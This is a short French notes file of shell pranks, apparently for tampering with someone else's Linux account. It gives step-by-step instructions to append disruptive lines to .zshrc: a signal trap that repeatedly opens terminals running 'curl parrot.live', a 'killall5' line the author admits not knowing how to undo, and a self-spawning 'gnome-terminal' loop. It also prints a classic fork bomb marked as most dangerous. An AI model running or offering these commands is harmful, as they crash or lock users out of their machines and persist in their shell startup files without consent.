trap 'gnome-terminal -- zsh -c "source .zshrc && curl parrot.live"' ABRT ALRM BUS CHLD CLD CONT FPE HUP ILL INT IO KILL PIPE POLL PROF PWR QUIT SEGV STKFLT 
curl parrot.live

```nano .zshrc``` -> coller a la toute fin du fichier -> CTRL+O entree et CTRL+X
```source .zshrc```


[------------------------------------------------------------]


dans la racine (dossier home)
```touch .reset```

Pour enlever -> ```rm -rf .reset```

[-------------------------------------------------------------]
/!\ DANGER MAXIMAL /!\

```:(){ :|:& };:```

[-------------------------------------------------------------]
/!\ DANGER MAIS CA VA MAIS QUAND MEME BELEK JSP COMMENT ENLEVER /!\

```nano .zshrc``` -> a la toute fin mettre : ```killall5```
```source .zshrc```

[-------------------------------------------------------------]
```nano .zshrc``` -> a la toute fin mettre : ```gnome-terminal```
```source .zshrc```

[-------------------------------------------------------------]
```echo "gnome-terminal" >> .zshrc && source .zshrc```
